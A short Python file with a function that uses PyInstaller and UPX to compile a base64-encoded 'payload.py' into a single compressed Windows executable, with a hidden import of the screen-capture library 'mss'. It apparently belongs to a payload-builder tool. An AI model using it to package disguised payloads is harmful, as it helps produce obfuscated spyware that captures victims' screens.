import subprocess

# Activates virtual enviroment and runs pyinstaller command to convert from py to exe. hidden import is used as the paylaod generated script is base64 encoded and pyinstaller cannot detect such imports if any were used.
def convert_to_exe() -> None:
    subprocess.run(r"venv\Scripts\activate && pyinstaller --onefile --hidden-import mss --upx-dir tools\compression --distpath output\executable --workpath output\conversion_data --specpath output\conversion_data output\source\payload.py", shell=True)

